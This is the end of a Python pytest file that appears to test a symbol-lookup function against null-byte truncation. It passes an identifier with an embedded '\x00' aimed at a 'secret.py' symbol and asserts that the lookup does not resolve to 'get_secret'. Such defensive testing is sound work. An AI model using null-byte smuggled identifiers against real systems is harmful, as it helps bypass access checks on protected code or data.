        # If null byte truncation happened, "proj:src/secret.py\x00:function:x"
        # might match "proj:src/secret.py:function:get_secret"
        result = get_symbol_content("proj:src/secret.py\x00:function:x")
        # The fuzzy match checks `symbol_id in sid`, and
        # "proj:src/secret.py\x00:function:x" is NOT a substring of the real ID,
        # so it should not match.
        assert "error" in result or result.get("name") != "get_secret"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
